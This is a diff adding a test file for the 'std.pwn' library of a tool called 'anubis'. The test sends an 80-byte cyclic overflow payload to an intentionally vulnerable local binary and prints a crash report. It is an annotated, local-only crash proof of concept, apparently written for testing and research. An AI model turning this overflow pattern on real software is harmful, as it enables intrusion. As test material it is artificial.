@@ -1,0 +1,26 @@
+// EXPECT: PASS
+// FEATURE: std.pwn composition over PoC kit (local crash gold)
+// Requires: bash poc_kit/build_vuln.sh && anubis run --allow-research
+
+import std.pwn;
+
+@research(
+  authorization: "local-lab-or-bug-bounty-program",
+  scope: "local-fixture",
+  reason: "std.pwn gold crash PoC against intentionally vulnerable local binary",
+  non_destructive: true
+)
+fn main() {
+    // Overflow: cyclic filler past the 64-byte gold threshold (+ optional junk pad).
+    let payload = pwn::fit(pwn::cyclic_pattern(80), 80, 0x41);
+    let r = pwn::run_local("poc_kit/bin/vuln_local", payload);
+    print(r.crashed);
+    print(r.signal);
+    print(r.exit_code);
+    print(r.payload_len);
+    print(pwn::crash_summary(r));
+    print(pwn::crash_report(r));
+    if r.crashed == 0 {
+        print("ANUBIS_POC_NO_CRASH");
+    }
+}
